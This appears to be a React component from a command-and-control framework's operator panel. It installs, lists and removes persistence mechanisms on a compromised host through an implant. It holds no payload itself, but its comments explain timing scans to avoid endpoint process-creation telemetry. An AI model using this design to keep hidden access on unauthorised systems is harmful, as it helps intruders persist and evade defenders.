import { useCallback, useEffect, useMemo, useState } from 'react'
import { useTranslation } from 'react-i18next'
import { api } from '../../lib/api'
import type { PersistenceItem, PersistenceModule } from '../../lib/types'
import { useToast } from '../common/Toast'

// defaultPayload is the path the install form seeds for the session's own
// platform. A Windows host keeps its implant under %SystemRoot%\Temp; a POSIX
// host has no such tree, and seeding a Linux form with a C:\ path invites a
// copy-paste install that silently does nothing on the target.
const DEFAULT_PAYLOADS: Record<string, string> = {
  windows: 'C:\\Windows\\Temp\\agent.exe',
  linux: '/tmp/agent',
  darwin: '/tmp/agent',
}

function defaultPayload(os: string) {
  return DEFAULT_PAYLOADS[os.toLowerCase()] || '/tmp/agent'
}

/**
 * PersistenceTab drives the server-side persistence catalog.
 *
 * One column, top to bottom: the catalog cards first - clicking one opens its
 * install form - then the live "present on host" list. Installing or removing a
 * mechanism is an agent round trip that can take a while, so every row keeps
 * its own busy flag and only that row's buttons are disabled while it is in
 * flight.
 */
export default function PersistenceTab({ sessionId, os }: { sessionId: string; os: string }) {
  const { t, i18n } = useTranslation()
  const toast = useToast()

  const [modules, setModules] = useState<PersistenceModule[]>([])
  const [items, setItems] = useState<PersistenceItem[]>([])
  const [platform, setPlatform] = useState('')
  // Starts false: the mount path only fetches the catalog, which is instant and
  // answered by the server itself. Only a scan sets it true, because only a scan
  // waits on the target.
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const [selected, setSelected] = useState('')
  const [payload, setPayload] = useState(() => defaultPayload(os))
  const [name, setName] = useState('')
  // Busy keys are per row: a module id for the catalog form, "item:<module>:<name>"
  // for a row in the present-on-host table.
  const [busy, setBusy] = useState<Record<string, boolean>>({})

  const markBusy = (key: string, on: boolean) =>
    setBusy((prev) => {
      if (!on) {
        const next = { ...prev }
        delete next[key]
        return next
      }
      return { ...prev, [key]: true }
    })

  const loadModules = useCallback(async () => {
    try {
      const d = await api.persistenceModules()
      setModules(d.modules || [])
    } catch (e) {
      setError((e as Error).message)
    }
  }, [])

  // checkName is the artifact name the inventory is asked about. Name-scoped
  // mechanisms (a task, a service, an account) can only be looked up by name, so
  // without one the server can report no more than "could not check".
  const [checkName, setCheckName] = useState('')

  // scanned records whether the operator has asked the target anything yet.
  //
  // The inventory is not passive: each row is answered by running a query on the
  // target, roughly eighteen processes for a full sweep. Doing that on tab open
  // means merely looking at the page leaves a burst of reg/dir/schtasks/sc
  // children of the implant in the endpoint's process-creation telemetry, and
  // every repeat visit repeats it. So the sweep is something the operator asks
  // for, and the tab says so until they do.
  const [scanned, setScanned] = useState(false)

  const loadList = useCallback(async () => {
    setLoading(true)
    setError('')
    try {
      const d = await api.persistenceList(sessionId, checkName.trim() || undefined)
      setItems(d.items || [])
      setPlatform(d.platform || '')
      setScanned(true)
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setLoading(false)
    }
  }, [sessionId, checkName])

  // Only the catalog is fetched on mount. That call is answered by the server
  // from its own table and touches the target not at all, which is what makes
  // opening the tab free.
  useEffect(() => {
    loadModules()
  }, [loadModules])

  // Modules whose platform list mentions the session OS are surfaced first; the
  // rest stay available, since the server is the authority on what will work.
  const ordered = useMemo(() => {
    const rank = (m: PersistenceModule) =>
      m.platforms.length === 0 || m.platforms.some((p) => p.toLowerCase() === os.toLowerCase()) ? 0 : 1
    return [...modules].sort((a, b) => rank(a) - rank(b))
  }, [modules, os])

  // Mechanisms already present on the host, so the catalog can mark a module
  // as installed without a second lookup.
  //
  // The catalog is server-owned data, so its two languages arrive with it rather
  // than from the bundles. Picking here keeps the fallback honest: a module the
  // backend has no translation for renders its English text, never a blank card.
  const zh = i18n.language !== 'en'
  const moduleName = (m: PersistenceModule) => (zh && m.nameZh ? m.nameZh : m.name)
  const moduleDesc = (m: PersistenceModule) => (zh && m.descriptionZh ? m.descriptionZh : m.description)
  const installedModules = useMemo(() => {
    const s = new Set<string>()
    for (const it of items) {
      if (it.installed) s.add(it.module)
    }
    return s
  }, [items])

  const presentCount = items.filter((it) => it.installed).length

  const pick = (m: PersistenceModule) => {
    if (selected === m.id) {
      setSelected('')
      return
    }
    setSelected(m.id)
    // A module whose first field is not a file (the account creator takes a
    // password) starts empty rather than carrying a path that means nothing.
    setPayload(m.payloadLabel ? '' : defaultPayload(os))
    setName(m.id)
  }

  const install = async (m: PersistenceModule) => {
    markBusy(m.id, true)
    setError('')
    try {
      const target = name.trim() || m.id
      const res = await api.persistenceInstall(sessionId, m.id, payload.trim(), target)
      toast.push(res.ok ? 'success' : 'error', res.message || t('persistence.installOk', { name: target }))
      await loadList()
    } catch (e) {
      setError((e as Error).message)
    } finally {
      markBusy(m.id, false)
    }
  }

  const remove = async (module: string, itemName: string, key: string) => {
    markBusy(key, true)
    setError('')
    try {
      const res = await api.persistenceRemove(sessionId, module, itemName)
      toast.push(res.ok ? 'success' : 'error', res.message || t('persistence.removeOk', { name: itemName }))
      await loadList()
    } catch (e) {
      setError((e as Error).message)
    } finally {
      markBusy(key, false)
    }
  }

  return (
    <div className="card card-flush">
      <div className="fs-toolbar" style={{ padding: '12px 16px', marginBottom: 0 }}>
        <button type="button" className="btn sm" onClick={loadList} disabled={loading}>
          {t('persistence.refresh')}
        </button>
        <span className="page-sub" style={{ margin: 0 }}>
          {t('persistence.summary', { present: presentCount, total: items.length })}
        </span>
        <span className="badge gray mono">{platform || os}</span>
        <div style={{ marginLeft: 'auto' }}>
          <span className="page-sub" style={{ margin: 0 }}>
            {t('persistence.moduleCount', { count: modules.length })}
          </span>
        </div>
      </div>

      {error && (
        <div style={{ padding: '0 16px 12px' }}>
          <div className="error-banner">{error}</div>
        </div>
      )}

      {loading ? (
        <div className="empty">{t('common.loading')}</div>
      ) : ordered.length === 0 ? (
        <div className="empty">{t('persistence.noModules')}</div>
      ) : (
        <>
          {/* The catalog is static and always shown: an operator can install
              without probing first. Only the per-host state needs the sweep, so
              the note says what is still unknown rather than hiding the list. */}
          {!scanned && (
            <div style={{ padding: '0 16px 12px' }}>
              <div className="page-sub" style={{ margin: 0 }}>{t('persistence.notScanned')}</div>
            </div>
          )}
          <div style={{ padding: '0 16px 12px', display: 'grid', gap: 10 }}>
          {ordered.map((m) => {
            const open = selected === m.id
            const installed = installedModules.has(m.id)
            const moduleBusy = !!busy[m.id]
            const key = `item:${m.id}:${name.trim() || m.id}`
            return (
              <div
                key={m.id}
                className="card"
                style={{ padding: '12px 14px', margin: 0, cursor: 'pointer' }}
                onClick={() => pick(m)}
              >
                <div style={{ display: 'flex', gap: 8, alignItems: 'center', flexWrap: 'wrap' }}>
                  <strong>{moduleName(m)}</strong>
                  <span className="badge gray mono" style={{ fontSize: 11 }} title={t('persistence.technique')}>
                    {m.technique}
                  </span>
                  {m.requiresAdmin && (
                    <span className="badge yellow" style={{ fontSize: 11 }}>
                      {t('persistence.admin')}
                    </span>
                  )}
                  {installed && (
                    <span className="badge green" style={{ fontSize: 11 }}>
                      {t('persistence.present')}
                    </span>
                  )}
                  <span className="mono" style={{ marginLeft: 'auto', fontSize: 11, opacity: 0.6 }}>
                    {m.id}
                  </span>
                </div>

                <p className="page-sub" style={{ margin: '6px 0 0' }}>
                  {moduleDesc(m)}
                </p>

                {m.platforms.length > 0 && (
                  <div style={{ display: 'flex', gap: 6, marginTop: 6, flexWrap: 'wrap' }}>
                    {m.platforms.map((p) => (
                      <span key={p} className="badge gray" style={{ fontSize: 11 }}>
                        {p}
                      </span>
                    ))}
                  </div>
                )}

                {open && (
                  <div className="pf-form" style={{ marginTop: 12 }} onClick={(e) => e.stopPropagation()}>
                    <div className="field" style={{ flex: 2 }}>
                      <label>{t(m.payloadLabel || 'persistence.payload')}</label>
                      <input
                        value={payload}
                        onChange={(e) => setPayload(e.target.value)}
                        placeholder={m.payloadLabel ? '' : defaultPayload(os)}
                      />
                    </div>
                    <div className="field">
                      <label>{t(m.nameLabel || 'persistence.name')}</label>
                      <input value={name} onChange={(e) => setName(e.target.value)} placeholder={m.id} />
                    </div>
                    <div className="field" style={{ flexDirection: 'row', gap: 8, justifyContent: 'flex-end' }}>
                      <button
                        type="button"
                        className="btn primary"
                        disabled={moduleBusy}
                        onClick={() => install(m)}
                      >
                        {moduleBusy ? t('persistence.installing') : t('persistence.install')}
                      </button>
                      <button
                        type="button"
                        className="btn danger"
                        disabled={moduleBusy || !name.trim()}
                        onClick={() => remove(m.id, name.trim() || m.id, key)}
                      >
                        {t('persistence.remove')}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            )
          })}
          </div>
        </>
      )}

      <div
        className="card-title"
        style={{ padding: '0 16px', display: 'flex', alignItems: 'center', gap: 10 }}
      >
        {t('persistence.presentOnHost')}
        {/* Name-scoped mechanisms (a task, a service, an account) cannot be
            looked up anonymously, so the inventory needs a name to answer for
            them. Typing one re-runs the check and clears the "needs a name"
            rows; the field is a filter, not a required value. */}
        <input
          value={checkName}
          onChange={(e) => setCheckName(e.target.value)}
          placeholder={t('persistence.checkName')}
          style={{ marginLeft: 'auto', width: 220 }}
        />
        {checkName.trim() && (
          <button type="button" className="btn sm" onClick={() => setCheckName('')}>
            {t('persistence.clearName')}
          </button>
        )}
      </div>

      <table className="data">
        <thead>
          <tr>
            <th>{t('persistence.thName')}</th>
            <th>{t('persistence.thLocation')}</th>
            <th>{t('persistence.thState')}</th>
            <th></th>
          </tr>
        </thead>
        <tbody>
          {items.length === 0 && (
            <tr>
              <td className="empty" colSpan={4}>
                {t('persistence.empty')}
              </td>
            </tr>
          )}
          {items.map((it) => {
            const key = `item:${it.module}:${it.name}`
            const rowBusy = !!busy[key]
            return (
              <tr key={key}>
                <td>
                  {it.name}
                  <span className="mono" style={{ marginLeft: 8, fontSize: 11, opacity: 0.6 }}>
                    {it.module}
                  </span>
                </td>
                <td className="mono" style={{ maxWidth: 420, overflow: 'hidden', textOverflow: 'ellipsis' }}>
                  {it.location || '-'}
                </td>
                <td>
                  {it.unknown ? (
                    // A name-scoped artifact cannot be checked by the unnamed
                    // inventory pass. Showing this as "absent" would tell the
                    // operator the host is clean right after installing here.
                    <span className="badge yellow">
                      {t('persistence.needsName')}
                    </span>
                  ) : (
                    <span className={`badge ${it.installed ? 'green' : 'gray'}`}>
                      {it.installed ? t('persistence.present') : t('persistence.absent')}
                    </span>
                  )}
                  {it.detail && (
                    <span className="page-sub" style={{ margin: '0 0 0 8px' }}>
                      {it.detail}
                    </span>
                  )}
                </td>
                <td>
                  {it.removable && it.installed && (
                    <button
                      type="button"
                      className="btn sm danger"
                      disabled={rowBusy}
                      onClick={() => remove(it.module, it.name, key)}
                    >
                      {rowBusy ? t('persistence.removing') : t('persistence.remove')}
                    </button>
                  )}
                </td>
              </tr>
            )
          })}
        </tbody>
      </table>
    </div>
  )
}
